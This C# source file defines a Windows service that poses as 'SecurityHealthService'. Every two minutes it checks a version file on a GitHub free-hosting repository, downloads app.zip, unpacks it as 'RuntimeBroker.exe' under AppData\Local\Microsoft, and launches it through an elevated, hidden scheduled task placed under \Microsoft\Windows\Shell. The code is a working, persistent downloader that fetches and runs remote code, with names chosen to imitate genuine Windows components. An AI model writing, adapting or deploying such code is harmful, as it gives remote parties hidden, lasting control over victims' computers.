﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace WindowsSecurityHealthService
{
    partial class SecurityHealthService : ServiceBase
    {
        static string versionUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/version";
        static string appZipUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/app.zip";
        static string userProfilePath = $"C:\\Users\\{GetUserName()}";
        static string localAppDataPath = Path.Combine(userProfilePath, "AppData", "Local");
        static string currentDir = Path.Combine(localAppDataPath, @"Microsoft\RuntimeBroker");
        static string assemblyFile = Path.Combine(currentDir, "RuntimeBroker.exe");
        static string taskName = "RuntimeBroker";
        static string tempZipPath = Path.Combine(Path.GetTempPath(), "app.zip");

        public SecurityHealthService()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {

            Trace.Listeners.Clear();
            string appLogPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"app.log");
            TextWriterTraceListener twtl = new TextWriterTraceListener(appLogPath);
            twtl.Name = "TextLogger";
            twtl.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;

            ConsoleTraceListener consoleTraceListener = new ConsoleTraceListener();
            consoleTraceListener.Name = "TextLogger";
            consoleTraceListener.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;

            Trace.Listeners.Add(twtl);
            Trace.Listeners.Add(consoleTraceListener);

            Trace.AutoFlush = true;
            Trace.WriteLine("===================");
            Trace.WriteLine("U:" + localAppDataPath);
            // TODO: Add code here to start your service.

            int time = (int)TimeSpan.FromSeconds(120).TotalMilliseconds;

            Task.Run(async () =>
            {
                while (true)
                {
                    try
                    {
                        string serverVersion = GetServerVersion();
                        string assemblyVersion = GetAssemblyVersion();

                        if (serverVersion == null)
                        {
                            await Task.Delay(time);
                            continue;
                        }
                        else
                        {
                            if (assemblyVersion == null)
                            {
                                Trace.WriteLine("A newer version is available. Downloading and running the update script...");
                                DownloadAndRunScript();
                            }
                            else
                            {
                                Trace.WriteLine($"Server Version: {serverVersion}");
                                Trace.WriteLine($"Assembly Version: {assemblyVersion}");

                                if (new Version(assemblyVersion) < new Version(serverVersion))
                                {
                                    Trace.WriteLine("A newer version is available. Downloading and running the update script...");
                                    DownloadAndRunScript();
                                }
                                else
                                {
                                    Trace.WriteLine("No update is needed. The assembly version is up-to-date.");

                                    // Check if Runtimebroker not running
                                    if (!IsProcessRunning(assemblyFile))
                                    {
                                        Console.WriteLine("Checking if the RuntimeBroker task exists");
                                        if (IsTaskExist(taskName))
                                        {
                                            Trace.WriteLine("Run the RuntimeBroker task");
                                            RunScheduledTask(taskName);
                                        }
                                        else
                                        {
                                            Trace.WriteLine("Task does not exist, downloading and running the script");
                                            DownloadAndRunScript();
                                        }
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Trace.WriteLine(ex.Message);
                    }
                    finally
                    {
                        await Task.Delay(time);
                    }
                }
            });

        }

        protected override void OnStop()
        {
            // TODO: Add code here to perform any tear-down necessary to stop your service.
        }

        public void OnStartManually(string[] args)
        {
            OnStart(args);
        }

        private static string GetUserName()
        {
            SelectQuery query = new SelectQuery(@"Select * from Win32_Process");
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
            {
                foreach (System.Management.ManagementObject Process in searcher.Get())
                {
                    if (Process["ExecutablePath"] != null && string.Equals(Path.GetFileName(Process["ExecutablePath"].ToString()), "explorer.exe", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] OwnerInfo = new string[2];
                        Process.InvokeMethod("GetOwner", (object[])OwnerInfo);
                        return OwnerInfo[0];
                    }
                }
            }

            return "";
        }

        static string GetServerVersion()
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    string serverVersion = client.DownloadString(versionUrl);
                    return serverVersion.Trim();
                }
            }
            catch (Exception ex)
            {
                Trace.WriteLine($"Failed to retrieve version from the server: {ex.Message}");
                return null;
            }
        }

        static string GetAssemblyVersion()
        {
            try
            {
                Trace.WriteLine($"assemblyFile: {assemblyFile}");
                var versionInfo = FileVersionInfo.GetVersionInfo(assemblyFile);
                return versionInfo.ProductVersion;
            }
            catch (Exception ex)
            {
                Trace.WriteLine($"Failed to retrieve version from the assembly file: {ex.Message}");
                return null;
            }
        }

        static void DownloadAndRunScript()
        {
            try
            {
                // Stop the scheduled task if it exists and is running
                if (IsTaskExist(taskName))
                {
                    Trace.WriteLine("IsTaskExist");
                    StopScheduledTask(taskName);
                }

                // Kill the process if it is running
                if (IsProcessRunning(assemblyFile))
                {
                    Trace.WriteLine("KillProcess");
                    KillProcess(assemblyFile);
                }
                Trace.WriteLine("Start download file");
                // Download the zip file
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile(appZipUrl, tempZipPath);
                }

                // Extract the zip file to the current directory
                if (Directory.Exists(currentDir))
                {
                    Directory.Delete(currentDir, true);
                }
                Trace.WriteLine("ExtractToDirectory");
                ZipFile.ExtractToDirectory(tempZipPath, currentDir);

                Trace.WriteLine("Downloaded and extracted app.zip successfully.");

                RunScheduledTask(taskName);
            }
            catch (Exception ex)
            {
                Trace.WriteLine($"Failed to download or run the script: {ex.Message}");
            }
        }
        static void KillProcess(string filePath)
        {
            var processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(filePath));
            foreach (var process in processes)
            {
                if (process.MainModule.FileName.Equals(filePath, StringComparison.OrdinalIgnoreCase))
                {
                    process.Kill();
                    process.WaitForExit();
                    Trace.WriteLine($"Killed process {process.ProcessName} with PID {process.Id}");

                }
            }
        }
        static void StopScheduledTask(string taskName)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo("powershell")
                {
                    Arguments = $"-Command \"Stop-ScheduledTask -TaskName '{taskName}'\"",
                    Verb = "runas",
                    UseShellExecute = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                    if (process.ExitCode == 0)
                    {
                        Trace.WriteLine($"Stopped scheduled task '{taskName}' successfully.");
                    }
                    else
                    {
                        throw new Exception("Failed to stop the scheduled task.");
                    }
                }
            }
            catch (Exception ex)
            {
                Trace.WriteLine($"Failed to stop the scheduled task: {ex.Message}");
            }
        }

        static bool IsProcessRunning(string filePath)
        {
            var processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(filePath));
            return processes.Any(p => p.MainModule.FileName.Equals(filePath, StringComparison.OrdinalIgnoreCase));
        }

        static void RunScheduledTask(string taskName)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo("powershell")
                {
                    Arguments = $"-Command \"if (Get-ScheduledTask -TaskName '{taskName}' -ErrorAction SilentlyContinue) {{ Start-ScheduledTask -TaskPath '\\Microsoft\\Windows\\Shell' -TaskName '{taskName}' }} else {{ Write-Host 'Error: Scheduled task {taskName} was not created successfully.'; exit 1 }}\"",
                    Verb = "runas",
                    UseShellExecute = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(startInfo);
            }
            catch (Exception ex)
            {
                Trace.WriteLine($"Failed to run the scheduled task: {ex.Message}");
            }
        }

        static bool IsTaskExist(string taskName)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo("powershell")
                {
                    Arguments = $"-Command \"if (Get-ScheduledTask -TaskName '{taskName}' -ErrorAction SilentlyContinue) {{ return $true }} else {{ return $false }}\"",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                using (Process process = Process.Start(startInfo))
                {
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string result = reader.ReadToEnd().Trim();
                        return result.Equals("True", StringComparison.OrdinalIgnoreCase);
                    }
                }
            }
            catch (Exception ex)
            {
                Trace.WriteLine($"Failed to check if the task exists: {ex.Message}");
                return false;
            }
        }
    }
}
